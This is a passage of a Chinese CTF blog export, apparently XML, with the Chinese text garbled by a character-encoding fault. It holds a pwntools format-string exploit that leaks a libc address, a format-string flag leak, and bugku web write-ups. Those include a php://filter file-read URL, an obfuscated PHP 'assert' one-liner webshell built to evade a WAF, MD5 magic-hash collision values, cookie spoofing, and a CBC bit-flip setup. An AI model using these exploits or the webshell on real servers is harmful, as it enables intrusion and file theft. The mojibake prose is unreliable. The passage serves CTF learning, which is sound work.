æ•ˆå‘¢ï¼Ÿæˆ‘è‡ªå·±å°è¯•çš„ç»“æžœæ˜¯ç›´æŽ¥é€€å‡ºäº†ï¼Œä»€ä¹ˆéƒ½æ²¡æœ‰æ‰“å°å‡ºæ¥emm è¿™æ—¶å€™å¦‚æžœæˆ‘ä»¬æŒ‡å®šä¸€ä¸ªåˆæ³•çš„åœ°å€ï¼Œ æ¯”å¦‚gotè¡¨ä¸­æŸä¸ªå‡½æ•°çš„åœ°å€è¿™å°±å¾ˆç¥žå¥‡äº† expå¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627from pwn import *import timesh = process('./leakMemory')context.log_level = 'debug'leakmemory = ELF('./leakMemory')__isoc99_scanf_got = leakmemory.got['__isoc99_scanf']print hex(__isoc99_scanf_got)payload = p32(__isoc99_scanf_got) + '%4$s'print payloadpayload1 = '%4$s' #è¿™ä¸¤ä¸ªpayloadæ˜¯è‡ªå·±æµ‹è¯•çš„payload2 = 'AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p'gdb.attach(sh)#time.sleep(1)sh.sendline(payload)sh.recvuntil('%4$s\n')#print sh.recvuntil('%4$s\n')#print '\n'print hex(u32(sh.recv()[4:8])) # remove the first bytes of __isoc99_scanf@gotsh.interactive() æˆ‘ä»¬è¿è¡Œè¿™ä¸ªexpåœ¨pwndbgä¸­ä¸‹æ–­ç‚¹ è¿è¡Œåˆ°ç¬¬äºŒä¸ªprintfçš„æ—¶å€™ 123456789â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ STACK ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€00:0000â”‚ esp 0xffa3bdfc â€”â–¸ 0x80484f9 (main+115) â—‚â€” add esp, 0x1001:0004â”‚ 0xffa3be00 â€”â–¸ 0xffa3be10 â€”â–¸ 0x804a014 (_GLOBAL_OFFSET_TABLE_+20) â€”â–¸ 0xf7df2bb0 (__isoc99_scanf) â—‚â€” push ebp... â†“03:000câ”‚ 0xffa3be08 â€”â–¸ 0xf7f85410 â€”â–¸ 0x8048278 â—‚â€” inc edi /* 'GLIBC_2.0' */04:0010â”‚ 0xffa3be0c â€”â–¸ 0x804849d (main+23) â—‚â€” add ebx, 0x1b6305:0014â”‚ eax 0xffa3be10 â€”â–¸ 0x804a014 (_GLOBAL_OFFSET_TABLE_+20) â€”â–¸ 0xf7df2bb0 (__isoc99_scanf) â—‚â€” push ebp06:0018â”‚ 0xffa3be14 â—‚â€” '%4$s'07:001câ”‚ 0xffa3be18 â€”â–¸ 0xf7fb3900 (catch_hook) â—‚â€” 0x0 å¦ä¸€è¾¹ 123456789[+] Waiting for debugger: Done[DEBUG] Sent 0x9 bytes: 00000000 14 a0 04 08 25 34 24 73 0a â”‚Â·Â·Â·Â·â”‚%4$sâ”‚Â·â”‚ 00000009[DEBUG] Received 0x24 bytes: 00000000 30 30 30 30 30 30 30 31 2e 32 32 32 32 32 32 32 â”‚0000â”‚0001â”‚.222â”‚2222â”‚ 00000010 32 2e 66 66 66 66 66 66 66 66 2e 14 a0 04 08 25 â”‚2.ffâ”‚ffffâ”‚ff.Â·â”‚Â·Â·Â·%â”‚ 00000020 34 24 73 0a â”‚4$sÂ·â”‚â”‚ 00000024 continue 1234567[DEBUG] Received 0x8 bytes: 00000000 14 a0 04 08 b0 2b df f7 â”‚Â·Â·Â·Â·â”‚Â·+Â·Â·â”‚â”‚ 000000080xf7df2bb0[*] Switching to interactive mode[*] Process './leakMemory' stopped with exit code 0 (pid 5064)[*] Got EOF while reading in interactive è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±å¾—åˆ°äº†scanfå‡½æ•°çš„åœ°å€äº†ok è¿˜æœ‰å‡ ä¸ªåœ°æ–¹æ²¡å¼„æ˜Žç™½ä¹‹åŽå†å†™ ç¡®å®šå¯æŽ§åˆ¶æ ¼å¼åŒ–å­—ç¬¦ä¸²ä½ç½®çš„æ–¹æ³•æ—¢ç„¶ç¨‹åºæ˜¯æœ‰æ¼æ´žçš„ï¼Œæˆ‘ä»¬å°±å¿…é¡»çŸ¥é“å¯è¢«æŽ§åˆ¶çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„ä½ç½®ï¼Œè¿™æ—¶å€™å¤§è‡´æœ‰ä»¥ä¸‹å‡ ç§å§¿åŠ¿ æž„é€ ç±»ä¼¼ [tag]%p%p%p%p%p%p...è¿™æ ·çš„å‚æ•° Pwngdbä¸­æœ‰ä¸€ä¸ªå«åšfmargå¯ä»¥ç”¨æ¥èŽ·å–æŒ‡å®šåœ°å€åˆ°åº•æ˜¯ç¬¬å‡ ä¸ªå‚æ•° ä¸æ˜¯å¾ˆç†è§£ç¬¬ä¸€ç§æ–¹æ³•åŽŸç†ï¼Œä½†æ˜¯ç¬¬äºŒç§æ–¹æ³•æ¯”è¾ƒå¥½ç”¨ ä¸è¿‡æˆ‘ä»¬å¯ä»¥æ¥çœ‹ä¸€ä¸ªä¾‹å­ï¼š IDAä¸­çš„Cä»£ç ï¼š 12345678910111213141516171819202122232425262728293031323334353637int __cdecl main(int argc, const char **argv, const char **envp)&#123; char v4; // [rsp+3h] [rbp-3Dh] signed int i; // [rsp+4h] [rbp-3Ch] signed int j; // [rsp+4h] [rbp-3Ch] char *format; // [rsp+8h] [rbp-38h] _IO_FILE *fp; // [rsp+10h] [rbp-30h] char *v9; // [rsp+18h] [rbp-28h] char v10[24]; // [rsp+20h] [rbp-20h] unsigned __int64 v11; // [rsp+38h] [rbp-8h] v11 = __readfsqword(0x28u); fp = fopen("flag.txt", "r"); for ( i = 0; i &lt;= 21; ++i ) v10[i] = _IO_getc(fp); fclose(fp); v9 = v10; puts("what's the flag"); fflush(_bss_start); format = 0LL; __isoc99_scanf("%ms", &amp;format); for ( j = 0; j &lt;= 21; ++j ) &#123; v4 = format[j]; if ( !v4 || v10[j] != v4 ) &#123; puts("You answered:"); printf(format); puts("\nBut that was totally wrong lol get rekt"); fflush(_bss_start); return 0; &#125; &#125; printf("That's right, the flag is %s\n", v9); fflush(_bss_start); return 0;&#125; æ˜¾ç„¶çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ž æˆ‘ä»¬éœ€è¦åœ¨printfå‡½æ•°å¤„ä¸‹æ–­ç‚¹ ç„¶åŽéšä¾¿è¾“å…¥ä¸€äº›æ•°å­—: 123456789101112131415161718192021222324[-------------------------------------code-------------------------------------] 0x7ffff7a48e6c &lt;__fprintf+172&gt;: call 0x7ffff7b18c80 &lt;__stack_chk_fail&gt; 0x7ffff7a48e71: nop WORD PTR cs:[rax+rax*1+0x0] 0x7ffff7a48e7b: nop DWORD PTR [rax+rax*1+0x0]=&gt; 0x7ffff7a48e80 &lt;__printf&gt;: sub rsp,0xd8 0x7ffff7a48e87 &lt;__printf+7&gt;: test al,al 0x7ffff7a48e89 &lt;__printf+9&gt;: mov QWORD PTR [rsp+0x28],rsi 0x7ffff7a48e8e &lt;__printf+14&gt;: mov QWORD PTR [rsp+0x30],rdx 0x7ffff7a48e93 &lt;__printf+19&gt;: mov QWORD PTR [rsp+0x38],rcx[------------------------------------stack-------------------------------------]0000| 0x7fffffffde08 --&gt; 0x400890 (&lt;main+234&gt;: mov edi,0x4009b8)0008| 0x7fffffffde10 --&gt; 0x61000001 0016| 0x7fffffffde18 --&gt; 0x602cb0 ('a' &lt;repeats 16 times&gt;)0024| 0x7fffffffde20 --&gt; 0x602260 --&gt; 0x0 0032| 0x7fffffffde28 --&gt; 0x7fffffffde30 ("flag&#123;", '1' &lt;repeats 12 times&gt;, "&#125;\n\377\377\377")0040| 0x7fffffffde30 ("flag&#123;", '1' &lt;repeats 12 times&gt;, "&#125;\n\377\377\377")0048| 0x7fffffffde38 ("111111111&#125;\n\377\377\377")0056| 0x7fffffffde40 --&gt; 0xffffff0a7d31 [------------------------------------------------------------------------------]Legend: code, data, rodata, valueBreakpoint 1, __printf (format=0x602cb0 'a' &lt;repeats 16 times&gt;) at printf.c:2828 printf.c: No such file or directory. è¿™æ—¶å€™å¯ä»¥çœ‹åˆ°flagäº†ï¼Œæ³¨æ„æˆ‘ä»¬æ˜¯åœ¨æœ¬åœ°è°ƒè¯•ï¼Œè°ƒè¯•çš„æ—¶å€™å½“ç„¶å¯ä»¥çœ‹åˆ°flagï¼Œä¸€èˆ¬çš„pwné¢˜éƒ½æ˜¯è¦è¿œç¨‹è¿žæŽ¥çš„ å¦‚æžœæˆ‘ä»¬è¦æ³„éœ²flagçš„å€¼ï¼Œå°±éœ€è¦æž„é€ %n$sè¿™æ ·çš„ä¼ è¿›åŽ»ã€‚æ‰€ä»¥èŽ·å–å‚æ•°çš„ä½ç½®å¾ˆå…³é”® 12gdb-peda$ fmtarg 0x7fffffffde28The index of format argument : 10 ("\%9$p") é€šè¿‡Pwngdbå°±å¯ä»¥æŸ¥çœ‹å‚æ•°çš„ä½ç½®äº† è¿™æ—¶å€™è¿è¡Œ 12345678abc@ubuntu ~/Desktop/pwnEaxmple/zifuchuan % ./goodluck what's the flag%9$sYou answered:flag&#123;111111111111&#125;ï¿½ï¿½ï¿½But that was totally wrong lol get rekt å°±å¾—åˆ°äº†flag (è¿™é‡Œå€¼å¾—æ³¨æ„çš„å°±æ˜¯ï¼Œ64ä½ç³»ç»Ÿå’Œ32ä½ç³»ç»Ÿä¼ å‚æ˜¯ä¸ä¸€æ ·çš„)]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[bugku webé¢˜ç›®çš„wp]]></title>
    <url>%2F2019%2F02%2F07%2Fbugku-web%E9%A2%98%E7%9B%AE%E7%9A%84wp%2F</url>
    <content type="text"><![CDATA[welcome to bugkuctf ctrl + UæŸ¥çœ‹é¡µé¢æºä»£ç ï¼Œ å¦‚æžœæœ‰ $userä¸” file_get_contents($user, &#39;r&#39;) çš„ å€¼æ˜¯ æŒ‡å®šçš„å­—ç¬¦ä¸²ã€‚ å°±ä¼š include $file çš„å†…å®¹ ã€‚ å¹¶ä¸”æç¤ºæ˜¯ hint.phpè¿™ä¸ªæ–‡ä»¶ è¿™é‡Œæ¶‰åŠåˆ°ä¸€ä¸ªæ€Žä¹ˆæŠŠ get æ–¹æ³•ä¼ å…¥çš„å‚æ•°ä½œä¸ºä¸€ä¸ªæ–‡ä»¶æ‰“å¼€ã€‚ phpä¼ªåè®®è¿™é‡Œç”¨åˆ°äº† php://input ä½†æ˜¯ã€‚ã€‚ è¿™å°±è¦ç”¨åˆ°ç¬¬äºŒä¸ªä¼ªåè®®ï¼šphp://filter æˆ‘é‚£æ ·ä¼ é€’å‚æ•°ä¼šæŠ¥é”™ï¼Œ include($file) åªæ˜¯æŠŠ $file è¿™ä¸ªå˜é‡å½“ä½œæ–‡ä»¶ååŒ…æ‹¬è¿›åŽ»äº†ã€‚ å°±æ˜¯å«åœ¨æºä»£ç é‡Œï¼Œ ä¸æ˜¯ç®€å•åœ°æž„é€ ä¸€ä¸ªå‚æ•°å°±èƒ½è¾¾åˆ°çš„ã€‚ è¿™å°±æ˜¯ä¸€ä¸ªæ³„éœ²äº†æºç çš„æ¼æ´žäº†ã€‚ æœ€åŽæž„é€ çš„URLå¦‚ä¸‹ï¼šhttp://123.206.87.240:8006/test1/?txt=php://input&amp;file=php://filter/read=convert.base64-encode/resource=hint.php æƒŠå¹ã€‚base64 è§£å¯†ä¹‹åŽçš„æºä»£ç ã€‚ 12345678910111213&lt;?php class Flag&#123;//flag.php public $file; public function __tostring()&#123; if(isset($this-&gt;file))&#123; echo file_get_contents($this-&gt;file); echo "&lt;br&gt;"; return ("good"); &#125; &#125; &#125; ?&gt; ä»£ç é‡Œé¢æž„é€ äº†ä¸€ä¸ªç±»ã€‚å…¬æœ‰å˜é‡æ˜¯ $file ç»§ç»­çœ‹ä¸€ä¸‹ index.php çš„æºä»£ç  123456789101112131415161718192021222324252627282930313233&lt;?php $txt = $_GET["txt"]; $file = $_GET["file"]; $password = $_GET["password"]; if(isset($txt)&amp;&amp;(file_get_contents($txt,'r')==="welcome to the bugkuctf"))&#123; echo "hello friend!&lt;br&gt;"; if(preg_match("/flag/",$file))&#123; echo "Ã¤Â¸ÂÃ¨ÂƒÂ½Ã§ÂŽÂ°Ã¥ÂœÂ¨Ã¥Â°Â±Ã§Â»Â™Ã¤Â½ flagÃ¥Â“Â¦"; exit(); &#125;else&#123; include($file); $password = unserialize($password); echo $password; &#125; &#125;else&#123; echo "you are not the number of bugku ! "; &#125; ?&gt; &lt;!-- $user = $_GET["txt"]; $file = $_GET["file"]; $pass = $_GET["password"]; if(isset($user)&amp;&amp;(file_get_contents($user,'r')==="welcome to the bugkuctf"))&#123; echo "hello admin!&lt;br&gt;"; include($file); //hint.php &#125;else&#123; echo "you are not admin ! "; &#125; --&gt; æœ‰å‡ ä¸ªåœ°æ–¹æš‚æ—¶å†™ä¸åˆ°ä½ï¼Œ å…ˆåˆ°è¿™é‡Œå¥½äº†ã€‚ è¿‡ç‹—ä¸€å¥è¯å¾ˆè’™ 1234&lt;?php $poc="a#s#s#e#r#t"; $poc_1=explode("#",$poc); $poc_2=$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5]; $poc_2($_GET['s']) ?&gt; ä¸Šé¢æ˜¯é¢˜ç›®æç¤ºçš„è¿‡ç‹—ä¸€å¥è¯ä»£ç ã€‚ç„¶åŽâ€¦åŽé¢çš„ä¸ä¼šäº† å­—ç¬¦ï¼Œæ­£åˆ™ï¼Ÿ å‰å¥³å‹ä¸€é“å¾ˆæœ‰è¶£çš„é¢˜ç›®ï¼Œ å°±ä¸è¯´é¢˜ç›®äº†ï¼Œ ç›´æŽ¥æ”¾æˆ‘çš„æµ‹è¯•ä»£ç  123456789101112131415161718192021&lt;?phperror_reporting(0);if(isset($_GET['v1']) &amp;&amp; isset($_GET['v2']))&#123; $v1 = $_GET['v1']; $v2 = $_GET['v2']; echo "$v1&lt;/br&gt;"; var_dump($v1); echo "&lt;/br&gt;"; echo md5($v1)."&lt;/br&gt;"; echo "$v2&lt;/br&gt;"; echo md5($v2)."&lt;/br&gt;"; if($v1 != $v2 &amp;&amp; md5($v1) == md5($v2))&#123; echo "true"; &#125; else &#123; echo "false"; &#125;&#125;?&gt; ä¹Ÿæ˜¯ç¬¬ä¸€æ¬¡å‘çŽ°getè¿˜èƒ½ä¼ é€’æ•°ç»„ï¼ˆä¸è¿‡å½“ç„¶æ˜¯ä¸€å †çš„é”™è¯¯ï¼‰ MD5 collisionè¿˜ä¸å¤ªæ¸…æ¥šMD5 ç¢°æ’žæ˜¯å•¥ï¼Œ ä»¥åŽè¡¥å‘ payload120.24.86.145:9009/md5.php?a=s878926199a å¸¸ç”¨çš„MD5ç¢°æ’ž123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112QNKCDZO0e830400451993494058024219903391s878926199a0e545993274517709034328855841020s155964671a0e342768416822451524974117254469s214587387a0e848240448830537924465865611904s214587387a0e848240448830537924465865611904s878926199a0e545993274517709034328855841020s1091221200a0e940624217856561557816327384675s1885207154a0e509367213418206700842008763514s1502113478a0e861580163291561247404381396064s1885207154a0e5093672134182067008420087635140e861580163291561247404381396064s1885207154a0e509367213418206700842008763514s1836677006a0e481036490867661113260034900752s155964671a0e342768416822451524974117254469s1184209335a0e072485820392773389523109082030s1665632922a0e731198061491163073197128363787s1502113478a0e861580163291561247404381396064s1836677006a0e481036490867661113260034900752s1091221200a0e940624217856561557816327384675s155964671a0e342768416822451524974117254469s1502113478a0e861580163291561247404381396064s155964671a0e342768416822451524974117254469s1665632922a0e731198061491163073197128363787s155964671a0e342768416822451524974117254469s1091221200a0e940624217856561557816327384675s1836677006a0e481036490867661113260034900752s1885207154a0e509367213418206700842008763514s532378020a0e220463095855511507588041205815s878926199a0e545993274517709034328855841020s1091221200a0e940624217856561557816327384675s214587387a0e848240448830537924465865611904s1502113478a0e861580163291561247404381396064s1091221200a0e940624217856561557816327384675s1665632922a0e731198061491163073197128363787s1885207154a0e509367213418206700842008763514s1836677006a0e481036490867661113260034900752s1665632922a0e731198061491163073197128363787s878926199a0e545993274517709034328855841020 ç§‹åå±±è€å¸æœº123456789101112&lt;head&gt;&lt;title&gt;ä¸‹é¢çš„è¡¨è¾¾å¼çš„å€¼æ˜¯ç§‹åå±±çš„è½¦é€Ÿ&lt;/title&gt;&lt;meta charset="UTF-8"&gt;&lt;/head&gt;&lt;p&gt;äº²è¯·åœ¨2så†…è®¡ç®—è€å¸æœºçš„è½¦é€Ÿæ˜¯å¤šå°‘&lt;/p&gt;&lt;div&gt;1782911879+706686703-1996813020-984998196*1213520247-1805071043*379299795+1623596400-1052850963+2102818407-2101949215=?;&lt;/div&gt;&lt;style&gt;div,p&#123;text-align: center;margin: 0 auto;&#125;&lt;/style&gt; ä¸¤ç§’ä¹‹å†…è®¡ç®—å‡ºå¼å­ä¸­çš„å€¼ï¼Œ å†æäº¤ èœé¸¡è¿˜ä¸å¤ªä¼šå†™è„šæœ¬å‚è€ƒäº†dalaoä»¬çš„ä»£ç  123456789import requestsimport reurl = 'http://120.24.86.145:8002/qiumingshan/'s = requests.Session()source = s.get(url)expression = re.search(r'(\d+[+\-*])+(\d+)', source.text).group()result = eval(expression)post = &#123;'value': result&#125;print(s.post(url, data = post).text) ä¸è¿‡è¿˜æ˜¯æ²¡æžå‡ºæ¥ã€‚ å¤ä¹ ä¸€ä¸‹requestsåº“ 1234567import requests#æž„é€ requestså¯¹è±¡s = requests.get(url)s.post(url, )#å·®ä¸å¤šå°±è¿™äº›äº† cookiesæ¬ºéª— ç„¶è€Œæ³¨æ„åˆ°URLä¸­çš„lineå’Œfileæ—¶å°±èƒ½åšå‡ºæ¥äº†ã€‚ 1234567#ç”¨è„šæœ¬æŠŠä»£ç è·‘å‡ºæ¥import requestsa=30for i in range(a): url="http://120.24.86.145:8002/web11/index.php?line="+str(i)+"&amp;filename=aW5kZXgucGhw" s=requests.get(url) print s.text 1234567891011121314151617181920&lt;?phperror_reporting(0);$file=base64_decode(isset($_GET['filename'])?$_GET['filename']:"");$line=isset($_GET['line'])?intval($_GET['line']):0;if($file=='') header("location:index.php?line=&amp;filename=a2V5cy50eHQ=");$file_list = array('0' =&gt;'keys.txt','1' =&gt;'index.php',);if(isset($_COOKIE['margin']) &amp;&amp; $_COOKIE['margin']=='margin')&#123; //çœ‹è¿™é‡Œ $file_list[2]='keys.php'; &#125;if(in_array($file, $file_list))&#123;$fa = file($file);echo $fa[$line];&#125; ?&gt; æž„é€ cookieå°±è¡Œå•¦ï¼ˆç„¶è€Œæ²¡æžå‡ºflagæ¥ï¼‰ login4CBCå­—èŠ‚ç¿»è½¬æ”»å‡»æ”¾ä¸€å¼ ç»å…¸çš„å›¾ æ®å¸ˆå‚…ä»¬çš„wpè¯´æ˜¯æœ‰ä¸€ä¸ªindex.php.swpæ–‡ä»¶å­˜åœ¨ã€‚ç„¶è€Œæ²¡æ‰¾åˆ°ï¼Œ å…ˆæŠŠå¸ˆå‚…ä»¬æ‰¾åˆ°çš„æºç æ”¾ä¸Šæ¥ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980&lt;?phpdefine("SECRET_KEY", file_get_contents('/root/key'));define("METHOD", "aes-128-cbc");session_start();function get_random_iv()&#123; $random_iv=''; for($i=0;$i&lt;16;$i++)&#123; $random_iv.=chr(rand(1,255)); &#125; return $random_iv;&#125;function login($info)&#123; $iv = get_random_iv(); $plain = serialize($info); $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv); $_SESSION['username'] = $info['username']; setcookie("iv", base64_encode($iv)); setcookie("cipher", base64_encode($cipher));&#125;function check_login()&#123; if(isset($_COOKIE['cipher']) &amp;&amp; isset($_COOKIE['iv']))&#123; $cipher = base64_decode($_COOKIE['cipher']); $iv = base64_decode($_COOKIE["iv"]); if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv))&#123; $info = unserialize($plain) or die("&lt;p&gt;base64_decode('".base64_encode($plain)."') can't unserialize&lt;/p&gt;"); $_SESSION['username'] = $info['username']; &#125;else&#123; die("ERROR!"); &#125; &#125;&#125;function show_homepage()&#123; if ($_SESSION["username"]==='admin')&#123; echo '&lt;p&gt;Hello admin&lt;/p&gt;'; echo '&lt;p&gt;Flag is $flag&lt;/p&gt;'; &#125;else&#123; echo '&lt;p&gt;hello '.$_SESSION['username'].'&lt;/p&gt;'; echo '&lt;p&gt;Only admin can see flag&lt;/p&gt;'; &#125; echo '&lt;p&gt;&lt;a href="loginout.php"&gt;Log out&lt;/a&gt;&lt;/p&gt;';&#125;if(isset($_POST['username']) &amp;&amp; isset($_POST['password']))&#123; $username = (string)$_POST['username']; $password = (string)$_POST['password']; if($username === 'admin')&#123; exit('&lt;p&gt;admin are not allowed to login&lt;/p&gt;'); &#125;else&#123; info = array('username'=&gt;username,'password'=&gt;password); login(info); show_homepage(); &#125;&#125;else&#123; if(isset($_SESSION["username"]))&#123; check_login(); show_homepage(); &#125;else&#123; echo '&lt;body class="login-body"&gt; &lt;div id="wrapper"&gt; &lt;div class="user-icon"&gt;&lt;/div&gt; &lt;div class="pass-icon"&gt;&lt;/div&gt; &lt;form name="login-form" class="login-form" action="" method="post"&gt; &lt;div class="header"&gt; &lt;h1&gt;Login Form&lt;/h1&gt; &lt;span&gt;Fill out the form below to login to my super awesome imaginary control panel.&lt;/span&gt; &lt;/div&gt; &lt;div class="content"&gt; &lt;input name="username" type="text" class="input username" value="Username" onfocus="this.value=\'\'" /&gt; &lt;input name="password" type="password" class="input password" value="Password" onfocus="this.value=\'\'" /&gt; &lt;/div&gt; &lt;div class="footer"&gt; &lt;input type="submit" name="submit" value="Login" class="button" /&gt; &lt;/div&gt; &lt;/form&gt; &lt;/div&gt; &lt;/body&gt;'; &#125;&#125;?&gt;&lt;/html&gt; å¤‡ä»½æ˜¯ä¸ªå¥½ä¹ æƒ¯æ ¹æ®ä»¥å‰åšé¢˜çš„ç»éªŒï¼Œ å¤‡ä»½å°±æ˜¯åœ¨æç¤ºä½  å­˜åœ¨bakæ–‡ä»¶æ‰€ä»¥ç›´æŽ¥è¾“å…¥URLä¸º http://123.206.87.240:8002/web16/index.php.bak ç„¶åŽä¸‹è½½æ–‡ä»¶ä»£ç ï¼š 1234567891011121314&lt;?phpinclude_once "flag.php";ini_set("display_errors", 0);$str = strstr($_SERVER['REQUEST_URI'], '?');$str = substr($str,1);$str = str_replace('key','',$str);parse_str($str);echo md5($key1);echo md5($key2);if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123; echo $flag."å–å¾—flag";&#125;?&gt; åšä»£ç å®¡è®¡çš„é¢˜ç›®ï¼Œ è¿˜æ˜¯ä¸»è¦é è‡ªå·±å°è¯•ã€‚ 1234567891011121314151617181920212223242526&lt;?phperror_reporting(0);$str = strstr($_SERVER['REQUEST_URI'], '?');echo "$str"."&lt;/br&gt;";$str = substr($str, 1);echo "$str"."&lt;/br&gt;";$str = str_replace('key','', $str);echo "$str"."&lt;/br&gt;";parse_str($str);echo "$key1"."&lt;/br&gt;";echo md5($key1);echo "&lt;/br&gt;";echo md5($key2);if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2) echo 'flag';?&gt; ä¸Šé¢æ˜¯æˆ‘ç”¨æ¥æµ‹è¯•çš„ä»£ç  æž„é€ URLä¸º http://localhost/test/test.php?kkeyey1=1&amp;kkeyey2=2è¾“å‡ºäº†è¿™äº›ï¼š123456?kkeyey1=1&amp;kkeyey2=2kkeyey1=1&amp;kkeyey2=2key1=1&amp;key2=21c4ca4238a0b923820dcc509a6f75849bc81e728d9d4c2f636f067f89cc14862c ä¹‹å‰è¿˜å¾ˆç–‘æƒ‘ä¸ºä»€ä¹ˆæ²¡æœ‰getéƒ½èƒ½å¾—åˆ°å˜é‡ï¼Œ åŽŸæ¥æ˜¯parse_strè¿™ä¸ªå‡½æ•°åœ¨èµ·ä½œç”¨ã€‚ OKï¼Œ çŽ°åœ¨å°±æ˜¯è¡¨æ¼”çš„æ—¶é—´äº†ã€‚ å‚è€ƒèµ„æ–™https://blog.csdn.net/wy_97/article/details/77431111https://www.cnblogs.com/Pinging/p/8278168.htmlhttps://blog.csdn.net/qq_19861715/article/details/79384018 https://blog.csdn.net/qq_39629343/article/details/80696263 ç§‹åå±±è€å¸æœºcookieæ¬ºéª—CBCå­—èŠ‚ç¿»è½¬æ”»å‡» python requestsåº“å­¦ä¹ ]]></content>
      <categories>
        <category>bugkuctf</category>
      </categories>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
</search>
